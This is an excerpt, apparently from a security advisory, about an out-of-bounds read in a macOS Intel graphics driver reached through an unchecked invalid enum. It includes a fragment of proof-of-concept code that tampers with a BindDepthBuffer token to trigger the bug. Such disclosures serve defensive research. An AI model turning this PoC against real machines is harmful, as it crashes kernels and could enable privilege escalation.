...
If convertGLIndexToBufferIndex is passed an invalid enum value it returns 0xffff, however no call sites actually check the return
value and blindly pass it to IGAccelGLContext::getSurfaceBuffer which will use the index to read an object pointer out-of-bounds
and then call a virtual function.
...
It may be necessary to run the PoC a few times to hit the crash, since if the OOB value is NULL or the field at +40 of the read
pointer is NULL then this will just hit an error path and not crash.
  ...
  if (selector == 2 && connection == port){
    if (token_buf != 0){
      ...
      while(offset < token_buf_size/4){
        ...
        if (id == 0x9700) { //BindDepthBuffer
          printf("$$$$$$$$$$$$$$$$$ actually found the right token $$$$$$$$$$$$$$$$$$$\n");
          toks[offset+2] = 0xf0f0; // invalid enum value
        }
        len = toks[offset]>>16;
